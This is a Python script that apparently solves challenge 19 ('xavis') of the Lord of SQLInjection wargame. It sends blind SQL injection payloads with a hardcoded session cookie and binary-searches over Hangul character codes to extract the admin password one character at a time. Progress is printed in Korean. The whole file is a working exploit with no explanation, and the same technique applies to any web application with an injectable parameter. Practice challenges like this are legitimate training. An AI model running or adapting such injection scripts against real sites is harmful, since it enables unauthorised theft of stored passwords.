import requests

def send(param):
    url = "https://los.rubiya.kr/chall/xavis_04f071ecdadb4296361d2101e4a2c390.php"
    cookie = "dfksep8hnmequ6sm0qe1iu65pa"
    head = {"PHPSESSID":f"{cookie}"}
    my_url=url+param
    res=requests.get(my_url, cookies=head)
    return res.text

print("💘 LoS 19를 시작합니다")

ans = ""
endpoint = False

for len in range(1, 30):
    if(endpoint):
        break
    print(f"{len}번째 문자에 대해 검색합니다..")
    start = 44032
    end = 55203
    while True:
        if(endpoint):
            print(f"{len}번째 문자는 존재하지 않습니다.")
            print(f"👏 pw의 정체는 [{ans}]입니다!")
            break
        if(start==end):
            endpoint = True
        middle = round((start+end)/2)
        param=f"?pw=' || id=\"admin\" %26%26 ord(substr(pw,{len},1))>={middle} %23"
        if("Hello admin" in send(param)):
            param=f"?pw=' || id=\"admin\" %26%26 ord(substr(pw,{len},1))={middle} %23"
            if("Hello admin" in send(param)):
                print(f"{len}번째 문자의 십진수 → {middle}")
                ans += chr(middle)
                break
            else:
                start = middle
                continue
        else:
            end = middle
            continue
